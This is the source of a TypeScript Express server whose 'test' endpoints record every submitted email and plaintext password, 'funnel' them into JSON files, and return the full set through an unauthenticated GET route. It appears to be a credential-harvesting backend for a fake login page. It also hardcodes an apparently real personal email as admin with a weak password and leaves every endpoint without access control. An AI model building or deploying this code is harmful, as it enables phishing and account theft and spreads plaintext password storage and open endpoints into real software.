import express from 'express';
import path from 'path';
import fs from 'fs';
import { createServer as createViteServer } from 'vite';

interface LoginAttempt {
  time: string;
  email: string;
  password?: string;
  success: boolean;
}

type UsersMap = Record<string, string>;

const PORT = 3000;
const PRIMARY_ADMIN_EMAIL = 'adereraadenike@gmail.com';

const DATA_DIR = path.join(process.cwd(), 'server_data');
const USERS_PATH = path.join(DATA_DIR, 'users.json');
const ATTEMPTS_PATH = path.join(DATA_DIR, 'attempts.json');
const AUTHORIZED_PATH = path.join(DATA_DIR, 'test_authorized_users.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

const DEFAULT_USERS: UsersMap = {
  'alex.bennett@outlook.com': 'password123',
  'sarah.jenkins@contoso.com': 'welcome2026',
  'adereraadenike@gmail.com': 'admin123',
};

const DEFAULT_AUTHORIZED: string[] = [
  PRIMARY_ADMIN_EMAIL,
];

function readJsonFile<T>(filePath: string, fallback: T): T {
  try {
    if (fs.existsSync(filePath)) {
      const content = fs.readFileSync(filePath, 'utf-8');
      return JSON.parse(content) as T;
    }
  } catch (err) {
    console.error(`Error reading ${filePath}:`, err);
  }
  writeJsonFile(filePath, fallback);
  return fallback;
}

function writeJsonFile<T>(filePath: string, data: T): void {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf-8');
  } catch (err) {
    console.error(`Error writing ${filePath}:`, err);
  }
}

// Initial file checks
if (!fs.existsSync(USERS_PATH)) {
  writeJsonFile(USERS_PATH, DEFAULT_USERS);
}
if (!fs.existsSync(ATTEMPTS_PATH)) {
  writeJsonFile(ATTEMPTS_PATH, []);
}
if (!fs.existsSync(AUTHORIZED_PATH)) {
  writeJsonFile(AUTHORIZED_PATH, DEFAULT_AUTHORIZED);
}

async function startServer() {
  const app = express();
  app.use(express.json());

  // API Routes FIRST

  // 1. Fetch all test data (central funnel)
  app.get('/api/test/data', (req, res) => {
    const users = readJsonFile<UsersMap>(USERS_PATH, DEFAULT_USERS);
    const attempts = readJsonFile<LoginAttempt[]>(ATTEMPTS_PATH, []);
    const authorized = readJsonFile<string[]>(AUTHORIZED_PATH, DEFAULT_AUTHORIZED);
    
    // Ensure primary admin is always included
    const cleanAuth = Array.from(new Set([PRIMARY_ADMIN_EMAIL, ...authorized]));

    res.json({
      success: true,
      users,
      attempts,
      authorizedUsers: cleanAuth,
      primaryAdmin: PRIMARY_ADMIN_EMAIL,
      totalUsers: Object.keys(users).length,
      totalAttempts: attempts.length,
    });
  });

  // 2. Log login/authentication attempt & register/funnel account
  app.post('/api/test/attempt', (req, res) => {
    const { email, password, success } = req.body;
    const cleanEmail = (email || 'anonymous@test.local').trim().toLowerCase();
    const cleanPassword = password || '';
    const isSuccess = success !== false;

    const users = readJsonFile<UsersMap>(USERS_PATH, DEFAULT_USERS);
    const attempts = readJsonFile<LoginAttempt[]>(ATTEMPTS_PATH, []);

    // Always funnel into users.json (connected accounts)
    if (cleanEmail && !users[cleanEmail]) {
      users[cleanEmail] = cleanPassword || 'password123';
      writeJsonFile(USERS_PATH, users);
    } else if (cleanEmail && cleanPassword && users[cleanEmail] !== cleanPassword) {
      // update password if provided
      users[cleanEmail] = cleanPassword;
      writeJsonFile(USERS_PATH, users);
    }

    // Append to attempts.json (unlimited history)
    const newAttempt: LoginAttempt = {
      time: new Date().toISOString().slice(0, 19),
      email: cleanEmail,
      password: cleanPassword,
      success: isSuccess,
    };

    attempts.push(newAttempt);
    writeJsonFile(ATTEMPTS_PATH, attempts);

    res.json({
      success: true,
      message: 'Attempt funneled and recorded',
      attempt: newAttempt,
      usersCount: Object.keys(users).length,
      attemptsCount: attempts.length,
    });
  });

  // 3. Explicit registration endpoint
  app.post('/api/test/register', (req, res) => {
    const { email, password } = req.body;
    const cleanEmail = (email || '').trim().toLowerCase();
    const cleanPassword = password || 'password123';

    if (!cleanEmail) {
      return res.status(400).json({ success: false, message: 'Email required' });
    }

    const users = readJsonFile<UsersMap>(USERS_PATH, DEFAULT_USERS);
    const attempts = readJsonFile<LoginAttempt[]>(ATTEMPTS_PATH, []);

    users[cleanEmail] = cleanPassword;
    writeJsonFile(USERS_PATH, users);

    const newAttempt: LoginAttempt = {
      time: new Date().toISOString().slice(0, 19),
      email: cleanEmail,
      password: cleanPassword,
      success: true,
    };
    attempts.push(newAttempt);
    writeJsonFile(ATTEMPTS_PATH, attempts);

    res.json({
      success: true,
      message: 'User registered and funneled',
      usersCount: Object.keys(users).length,
      attemptsCount: attempts.length,
    });
  });

  // 4. Update authorized test viewers (grant/revoke)
  app.post('/api/test/authorize', (req, res) => {
    const { email, action } = req.body;
    const cleanEmail = (email || '').trim().toLowerCase();

    if (!cleanEmail || !cleanEmail.includes('@')) {
      return res.status(400).json({ success: false, message: 'Valid email required' });
    }

    let authorized = readJsonFile<string[]>(AUTHORIZED_PATH, DEFAULT_AUTHORIZED);

    if (action === 'remove') {
      if (cleanEmail === PRIMARY_ADMIN_EMAIL) {
        return res.status(400).json({ success: false, message: 'Cannot remove primary admin' });
      }
      authorized = authorized.filter(e => e.toLowerCase() !== cleanEmail);
    } else {
      // Add
      if (!authorized.map(e => e.toLowerCase()).includes(cleanEmail)) {
        authorized.push(cleanEmail);
      }
    }

    // Ensure primary admin is present
    if (!authorized.includes(PRIMARY_ADMIN_EMAIL)) {
      authorized.unshift(PRIMARY_ADMIN_EMAIL);
    }

    writeJsonFile(AUTHORIZED_PATH, authorized);

    res.json({
      success: true,
      authorizedUsers: authorized,
      message: action === 'remove' ? `Access revoked for ${cleanEmail}` : `Access granted to ${cleanEmail}`,
    });
  });

  // 5. Delete an account from users.json
  app.post('/api/test/delete-user', (req, res) => {
    const { email } = req.body;
    const cleanEmail = (email || '').trim().toLowerCase();

    const users = readJsonFile<UsersMap>(USERS_PATH, DEFAULT_USERS);
    delete users[cleanEmail];
    writeJsonFile(USERS_PATH, users);

    res.json({ success: true, users });
  });

  // 6. Clear attempts history
  app.post('/api/test/clear-attempts', (req, res) => {
    writeJsonFile(ATTEMPTS_PATH, []);
    res.json({ success: true, attempts: [] });
  });

  // 7. Reset to default state
  app.post('/api/test/reset-defaults', (req, res) => {
    writeJsonFile(USERS_PATH, DEFAULT_USERS);
    writeJsonFile(ATTEMPTS_PATH, []);
    writeJsonFile(AUTHORIZED_PATH, DEFAULT_AUTHORIZED);
    res.json({ success: true, users: DEFAULT_USERS, attempts: [], authorizedUsers: DEFAULT_AUTHORIZED });
  });

  // Health check
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', serverTime: new Date().toISOString() });
  });

  // Vite middleware for development vs static build for production
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
